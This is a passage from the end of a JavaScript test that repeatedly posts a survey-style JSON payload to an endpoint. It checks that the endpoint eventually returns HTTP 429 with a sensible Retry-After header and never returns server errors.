        body: JSON.stringify({ counts: { tests: 1 }, ranking: ['money', 'time', 'pain', 'work', 'people'] }),
      });
      codes.push(r.status);
      if (r.status === 429) {
        expect(Number(r.headers.get('retry-after'))).toBeGreaterThan(0);
        expect(Number(r.headers.get('retry-after'))).toBeLessThanOrEqual(3600);
        break;
      }
    }
    expect(codes).toContain(429);
    expect(codes.filter((c) => c >= 500)).toEqual([]);
  }, 60000);
});
